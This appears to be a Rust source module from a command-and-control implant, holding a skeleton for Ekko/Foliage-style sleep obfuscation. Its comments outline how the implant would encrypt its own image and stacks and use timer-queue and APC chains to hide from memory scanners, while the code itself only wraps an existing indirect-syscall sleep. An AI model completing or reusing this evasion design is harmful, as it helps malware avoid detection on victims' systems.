//! Sleep obfuscation (Ekko/Foliage-style) — research-grade skeleton.
//!
//! ## Status: SKELETON — not wired into the beacon loop.
//!
//! A full sleep mask (Ekko: CreateTimerQueueTimer + ROP; Foliage: NtContinue
//! APC) encrypts the implant image + all thread stacks and flips the .text
//! section RX→RW for the duration of the sleep, then restores it on wake. It's
//! the single highest-value stealth technique and the single most dangerous to
//! get wrong — a botched ROP/APC chain either crashes the implant (loud) or
//! leaves .text writable (louder). The implementation needs:
//!
//!   1. A second thread (CreateThread) the timer queue timer's APC can target,
//!      because the beacon thread itself is the one going to sleep.
//!   2. Resolved gadgets: `NtContinue`, `RtlCaptureContext`, a `ret` gadget in
//!      ntdll, plus the VirtualProtect/VirtualProtectEx entry points.
//!   3. An RC4/AES key derived per-sleep to encrypt the image in place.
//!   4. Careful handling of the APC context struct so wake-up restores RIP/RSP
//!      into the beacon loop exactly where it paused.
//!
//! None of that is safe to land without dedicated runtime testing on a target,
//! which the no_std PIC build can't do on this host. This module therefore
//! exposes the [`sleep`] entry point the beacon loop WILL call once the full
//! implementation lands, with a clear no-op fallback today so the loop stays
//! correct.
//!
//! ## What's real now
//! - The interface ([`sleep`]) and the integration contract (beacon calls it
//!   instead of plain NtDelayExecution when `mask_at_sleep` is on).
//! - [`mask_seed`] (reused from [`crate::mem`]) so the eventual encryption
//!   step is key-diverse per run.
//! - The honest no-op body that delegates to the indirect-syscall
//!   NtDelayExecution so callers see identical behavior to the current sleep.

#![cfg(target_os = "windows")]

/// Sleep `seconds` with sleep-mask obfuscation.
///
/// **Today**: a thin wrapper around the indirect-syscall `NtDelayExecution`
/// (the same call the beacon loop already makes). It does NOT yet encrypt the
/// image/stacks — see the module-level status note. The signature is fixed so
/// the beacon loop can switch `sleep_seconds(...)` to `sleep::sleep(...)`
/// behind a config flag without a refactor when the full implementation lands.
pub fn sleep(seconds: u32) {
    // Delegate to the existing beacon sleep (indirect NtDelayExecution with the
    // resolved-export fallback). Until the Ekko/Foliage chain is built and
    // runtime-tested, this is correct (just not yet masked).
    crate::beacon::sleep_seconds(seconds);
}
